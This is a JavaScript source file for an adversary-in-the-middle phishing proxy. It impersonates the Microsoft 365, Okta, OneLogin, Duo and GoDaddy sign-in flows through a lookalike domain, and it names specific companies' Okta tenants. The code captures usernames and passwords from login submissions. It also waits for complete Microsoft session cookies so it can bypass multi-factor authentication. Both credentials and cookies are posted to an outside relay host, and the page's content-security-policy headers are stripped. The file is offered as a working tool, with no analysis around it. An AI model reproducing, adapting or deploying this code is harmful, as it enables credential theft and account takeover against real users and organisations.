export const runtime = 'edge';

// ==================== CONFIG ====================
const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app';
const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
const INITIAL_UPSTREAM = 'login.microsoftonline.com';
const PROXY_PREFIX = '/_p/';
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

// All identity providers
const IDENTITY_PROVIDERS = {
  'login.microsoftonline.com': { type: 'microsoft', name: 'Microsoft' },
  'login.live.com': { type: 'microsoft', name: 'Microsoft Live' },
  'account.live.com': { type: 'microsoft', name: 'Microsoft Account' },
  'account.microsoft.com': { type: 'microsoft', name: 'Microsoft Account' },
  'aadcdn.msauth.net': { type: 'microsoft', name: 'Microsoft CDN' },
  'www.office.com': { type: 'microsoft', name: 'Office 365' },
  'office.com': { type: 'microsoft', name: 'Office 365' },
  'microsoft365.com': { type: 'microsoft', name: 'Microsoft 365' },
  'outlook.office.com': { type: 'microsoft', name: 'Outlook' },
  'outlook.live.com': { type: 'microsoft', name: 'Outlook Live' },
  'o.okta.com': { type: 'okta', name: 'Okta' },
  'sci.okta.com': { type: 'okta', name: 'Okta Sci' },
  'dotfoods.okta.com': { type: 'okta', name: 'Okta DotFoods' },
  'login.okta.com': { type: 'okta', name: 'Okta Login' },
  'ulgroup.okta.com': { type: 'okta', name: 'Okta ULGroup' },
  'empowermm.onelogin.com': { type: 'onelogin', name: 'OneLogin' },
  'duosecurity.com': { type: 'duo', name: 'Duo' },
  'api-aa1a6aea.duosecurity.com': { type: 'duo', name: 'Duo API' },
  'login.duosecurity.com': { type: 'duo', name: 'Duo Login' },
  'sso.godaddy.com': { type: 'godaddy', name: 'GoDaddy' },
  'sso.secureserver.net': { type: 'godaddy', name: 'GoDaddy Legacy' },
  'csp.secureserver.net': { type: 'godaddy', name: 'GoDaddy CSP' },
  'api.godaddy.com': { type: 'godaddy', name: 'GoDaddy API' },
  'www.godaddy.com': { type: 'godaddy', name: 'GoDaddy WWW' },
  'img1.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images' },
  'img2.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 2' },
  'img3.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 3' },
  'img4.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 4' },
  'img5.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 5' },
  'img6.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 6' }
};

// ==================== UTILITIES ====================

async function sendToVercel(type, data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
    });
  } catch (e) {}
}

async function exfiltrateCookies(cookieText, ip, platform, url) {
  try {
    const cleanUrl = url.split('?')[0];
    const content = `IP: ${ip}\nPlatform: ${platform}\nURL: ${cleanUrl}\n\n${cookieText}`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-${platform}-COOKIE.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");
    await fetch(VERCEL_URL, { method: "POST", body: formData });
  } catch (e) {}
}

function cleanQueryString(search) {
  if (!search) return '';
  const params = new URLSearchParams(search);
  while (params.has('path')) params.delete('path');
  for (const [key, value] of params) {
    if (!value || value === 'undefined' || value === 'null') {
      params.delete(key);
    }
  }
  const result = params.toString();
  return result ? '?' + result : '';
}

function isOurDomain(domain) {
  if (!domain) return false;
  return domain === YOUR_DOMAIN || domain.endsWith('.' + YOUR_DOMAIN);
}

function shouldProxyDomain(hostname) {
  if (!hostname) return false;
  if (IDENTITY_PROVIDERS[hostname]) return true;
  if (hostname.includes('microsoft') || hostname.includes('live.com') || 
      hostname.includes('office.com') || hostname.includes('msauth.net')) return true;
  if (hostname.includes('godaddy.com') || hostname.includes('secureserver.net')) return true;
  if (hostname.includes('okta.com')) return true;
  if (hostname.includes('onelogin.com')) return true;
  if (hostname.includes('duosecurity.com')) return true;
  if (hostname.includes('wsimg.com')) return true;
  return false;
}

// ==================== URL PARSING ====================

function parseUrl(pathname, search) {
  console.log(`[PARSE] Input: ${pathname}`);
  
  let path = pathname.startsWith('/') ? pathname.slice(1) : pathname;
  const parts = path.split('/');
  const segments = [];
  
  for (let i = 0; i < parts.length; i++) {
    if (parts[i] === '_p' && i + 1 < parts.length) {
      const domain = parts[i + 1];
      const remainingParts = parts.slice(i + 2);
      const remainingPath = remainingParts.length > 0 ? '/' + remainingParts.join('/') : '/';
      segments.push({ domain, path: remainingPath });
      i++;
    }
  }
  
  console.log(`[PARSE] Segments:`, segments.map(s => s.domain));
  
  let upstreamDomain = null;
  let upstreamPath = '/';
  
  for (const segment of segments) {
    if (!isOurDomain(segment.domain)) {
      upstreamDomain = segment.domain;
      upstreamPath = segment.path || '/';
      console.log(`[PARSE] Found upstream: ${upstreamDomain}`);
      break;
    }
  }
  
  if (!upstreamDomain && segments.length > 0) {
    const last = segments[segments.length - 1];
    if (!isOurDomain(last.domain)) {
      upstreamDomain = last.domain;
      upstreamPath = last.path || '/';
    }
  }
  
  if (!upstreamDomain) {
    const embeddedMatch = path.match(/.*\/https?:\/?\/?([^\/]+)(.*)/);
    if (embeddedMatch) {
      const embeddedHost = embeddedMatch[1];
      const embeddedPath = embeddedMatch[2] || '/';
      if (isOurDomain(embeddedHost)) {
        upstreamDomain = 'www.office.com';
        upstreamPath = embeddedPath;
      } else if (shouldProxyDomain(embeddedHost)) {
        upstreamDomain = embeddedHost;
        upstreamPath = embeddedPath;
      }
    }
  }
  
  if (!upstreamDomain) {
    for (const part of parts) {
      if (shouldProxyDomain(part)) {
        const idx = parts.indexOf(part);
        upstreamDomain = part;
        upstreamPath = '/' + parts.slice(idx + 1).join('/');
        break;
      }
    }
  }
  
  if (!upstreamDomain) {
    upstreamDomain = INITIAL_UPSTREAM;
    upstreamPath = pathname;
  }
  
  const provider = IDENTITY_PROVIDERS[upstreamDomain];
  return {
    upstream: upstreamDomain,
    type: provider ? provider.type : 'unknown',
    path: upstreamPath,
    search: cleanQueryString(search),
    isProxied: shouldProxyDomain(upstreamDomain)
  };
}

// ==================== LOCATION REWRITING ====================

function rewriteLocation(location, currentUpstream) {
  try {
    const url = new URL(location);
    console.log(`[REWRITE] Location: ${location}`);
    
    if (isOurDomain(url.hostname)) {
      if (url.pathname.startsWith(PROXY_PREFIX)) {
        return location;
      }
      return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${currentUpstream}${url.pathname}${cleanQueryString(url.search)}`;
    }
    
    if (shouldProxyDomain(url.hostname)) {
      return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${url.hostname}${url.pathname}${cleanQueryString(url.search)}`;
    }
    
    return location;
  } catch (e) {
    if (location.startsWith('/')) {
      if (location.startsWith(PROXY_PREFIX)) {
        return `https://${YOUR_DOMAIN}${location}`;
      }
      return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${currentUpstream}${location}`;
    }
    return location;
  }
}

// ==================== CREDENTIAL PARSING ====================

function parseCredentials(bodyText) {
  let user = null, pass = null;
  if (!bodyText) return { user, pass };
  
  try {
    const json = JSON.parse(bodyText);
    user = json.username || json.email || json.user || json.login || json.UserName;
    pass = json.password || json.passwd || json.pwd || json.pass || json.Password;
    if (user && pass) return { user, pass };
  } catch (e) {}
  
  const params = new URLSearchParams(bodyText);
  const userFields = ['login', 'loginfmt', 'username', 'email', 'user', 'UserName'];
  const passFields = ['passwd', 'password', 'pwd', 'pass', 'Password'];
  
  for (const f of userFields) if (params.has(f)) { user = params.get(f); break; }
  for (const f of passFields) if (params.has(f)) { pass = params.get(f); break; }
  
  return { user, pass };
}

// ==================== FIXED: COOKIE HANDLING ====================

function rewriteCookieDomain(cookieStr, upstreamDomain, ourDomain) {
  // Handle both Domain=upstream.com and Domain=.upstream.com
  // Use regex to match Domain attribute specifically to avoid replacing domain if it appears in cookie value
  const domainRegex = new RegExp(`(domain=\\.?)${upstreamDomain.replace(/\./g, '\\.')}`, 'i');
  return cookieStr.replace(domainRegex, (match, prefix) => {
    return prefix + ourDomain;
  });
}

function hasCompleteAuthSession(cookieStr) {
  if (!cookieStr) return false;
  const upper = cookieStr.toUpperCase();
  return upper.includes('ESTSAUTH') && upper.includes('ESTSAUTHPERSISTENT');
}

// ==================== MAIN HANDLER ====================

export default async function handleRequest(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  if (BLOCKED_IPS.includes(ip)) {
    return new Response('Access denied.', { status: 403 });
  }

  const info = parseUrl(url.pathname, url.search);
  const upstreamDomain = info.upstream;
  const upstreamUrl = `https://${upstreamDomain}${info.path}${info.search}`;
  
  console.log(`[${info.type}] ${request.method} ${url.pathname} -> ${upstreamUrl}`);

  // Build request headers
  const headers = new Headers();
  const clientHeaders = ['user-agent', 'accept', 'accept-language', 'accept-encoding', 'content-type', 'cookie', 'referer', 'origin', 'x-requested-with'];
  
  for (const h of clientHeaders) {
    const val = request.headers.get(h);
    if (val) headers.set(h, val);
  }

  headers.set('Host', upstreamDomain);
  
  if (!request.headers.get('referer')) {
    headers.set('Referer', `https://${upstreamDomain}/`);
  }
  if (!request.headers.get('origin')) {
    headers.set('Origin', `https://${upstreamDomain}`);
  }

  // Remove hop-by-hop headers
  ['expect', 'connection', 'keep-alive', 'proxy-connection', 'transfer-encoding', 
   'x-forwarded-host', 'x-forwarded-proto', 'x-forwarded-for'].forEach(h => headers.delete(h));

  let bodyText = null;
  let requestBody = null;

  // Capture credentials
  if (['POST', 'PUT', 'PATCH'].includes(request.method)) {
    try {
      const cloned = request.clone();
      bodyText = await cloned.text();
      const { user, pass } = parseCredentials(bodyText);
      
      if (user && pass) {
        console.log(`[CREDS] Captured: ${user.substring(0,5)}... on ${info.type}`);
        await sendToVercel('credentials', { type: 'creds', ip, user, pass, platform: info.type, url: url.href });
        
        const formData = new FormData();
        formData.append('file', new Blob([`IP: ${ip}\nUser: ${user}\nPass: ${pass}\nURL: ${url.href}`], {type: 'text/plain'}), `${ip}-CREDENTIALS.txt`);
        formData.append('ip', ip);
        formData.append('type', 'credentials');
        await fetch(VERCEL_URL, { method: 'POST', body: formData });
      }
      
      requestBody = bodyText;
    } catch (err) {
      requestBody = request.body;
    }
  }

  try {
    const resp = await fetch(upstreamUrl, {
      method: request.method,
      headers,
      body: requestBody,
      redirect: 'manual'
    });

    // Build response headers from scratch to avoid any cookie contamination
    const responseHeaders = new Headers();
    
    // Copy safe headers (not Set-Cookie)
    resp.headers.forEach((value, key) => {
      const lowerKey = key.toLowerCase();
      if (lowerKey !== 'set-cookie') {
        responseHeaders.set(key, value);
      }
    });
    
    // Security headers
    responseHeaders.set('access-control-allow-origin', '*');
    responseHeaders.set('access-control-allow-credentials', 'true');
    responseHeaders.delete('content-security-policy');
    responseHeaders.delete('content-security-policy-report-only');
    responseHeaders.delete('clear-site-data');

    // Handle redirects immediately
    if ([301, 302, 303, 307, 308].includes(resp.status)) {
      const loc = resp.headers.get('Location');
      if (loc) {
        const rewrittenLoc = rewriteLocation(loc, upstreamDomain);
        console.log(`[REDIRECT] ${loc} -> ${rewrittenLoc}`);
        responseHeaders.set('location', rewrittenLoc);
        
        // Handle cookies on redirect too
        const cookies = resp.headers.getSetCookie?.() || [];
        if (cookies.length > 0) {
          let cookieStr = cookies.join('; ');
          for (const cookie of cookies) {
            const modified = rewriteCookieDomain(cookie, upstreamDomain, url.hostname);
            responseHeaders.append('set-cookie', modified);
          }
          if (hasCompleteAuthSession(cookieStr)) {
            console.log(`[EXFILTRATING] Complete session on redirect`);
            await exfiltrateCookies(cookieStr, ip, info.type, url.href);
          }
        }
        
        return new Response(null, { status: resp.status, headers: responseHeaders });
      }
    }

    // Process cookies from upstream
    const cookies = resp.headers.getSetCookie?.() || [];
    let shouldExfiltrate = false;
    let cookieStr = '';

    if (cookies.length > 0) {
      cookieStr = cookies.join('; ');
      console.log(`[COOKIES] Received ${cookies.length} cookies: ${cookies.map(c => c.split('=')[0]).join(', ')}`);
      
      // Rewrite each cookie's domain and append to response
      for (const cookie of cookies) {
        const modifiedCookie = rewriteCookieDomain(cookie, upstreamDomain, url.hostname);
        responseHeaders.append('set-cookie', modifiedCookie);
      }
      
      // Check for complete session
      if (hasCompleteAuthSession(cookieStr)) {
        shouldExfiltrate = true;
        console.log(`[EXFILTRATING] Complete auth session captured`);
        await exfiltrateCookies(cookieStr, ip, info.type, url.href);
      }
    }

    // Process body
    const ct = resp.headers.get('content-type') || '';
    if (/text\/html|application\/javascript|application\/json|text\/css/.test(ct)) {
      let text = await resp.text();
      
      // Replace all upstream domains with our proxy domains
      for (const [domain, info] of Object.entries(IDENTITY_PROVIDERS)) {
        text = text.split(domain).join(`${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`);
      }
      
      return new Response(text, { status: resp.status, headers: responseHeaders });
    }

    return new Response(resp.body, { status: resp.status, headers: responseHeaders });

  } catch (err) {
    console.error(`[ERROR] ${err.message}`);
    return new Response(JSON.stringify({ error: 'Proxy Error', message: err.message }), { 
      status: 502, 
      headers: { 'content-type': 'application/json' } 
    });
  }
}

export const GET = handleRequest;
export const POST = handleRequest;
export const PUT = handleRequest;
export const DELETE = handleRequest;
export const PATCH = handleRequest;
export const OPTIONS = handleRequest;
export const HEAD = handleRequest;
